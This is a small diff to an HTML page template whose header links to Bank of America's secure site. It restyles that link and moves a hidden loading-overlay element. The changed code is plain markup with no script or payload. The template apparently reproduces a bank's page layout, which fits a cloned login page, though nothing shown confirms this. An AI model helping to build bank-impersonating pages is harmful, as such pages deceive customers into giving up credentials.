@@ -14,11 +14,16 @@
 </head>
 
 <body>
-  <a href="https://secure.bankofamerica.com/">
+  <a href="https://secure.bankofamerica.com/" style="z-index: 999!important;position: relative;" class="">
     <header></header>
+
   </a>
+  
 
   <main class="col-small-up">
+  <div style="display:none" id="loadingOverlay">
+		  <span id="loader" class="loader"></span>
+		</div>
     <div class="main-section flex-grid-nest">
       <div class="cb-container">
         <div class="row cb-collapse">
@@ -57,9 +62,7 @@
                     </div>
                   </div>
                 </div>
-                <div style="display:none" id="loadingOverlay">
-		  <span id="loader" class="loader"></span>
-		</div>
+                
                 @!section('content')
               </div>
             </div>
